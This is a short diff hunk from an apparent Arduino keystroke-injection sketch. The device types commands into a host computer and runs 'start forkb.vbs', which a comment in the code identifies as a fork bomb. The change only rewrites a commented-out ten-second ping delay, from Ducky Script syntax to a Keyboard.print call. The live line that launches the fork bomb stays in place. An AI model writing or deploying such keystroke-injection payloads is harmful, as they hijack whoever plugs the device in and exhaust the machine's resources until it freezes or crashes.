@@ -48,7 +48,7 @@ void setup()
 
   typeKey(KEY_RETURN);
 
-  // STRING ping localhost -n 10
+  // Keyboard.print("ping localhost -n 10");
   // You can uncomment this ^ to delay 10 seconds before starting the fork bomb.
   Keyboard.print("start forkb.vbs");
 
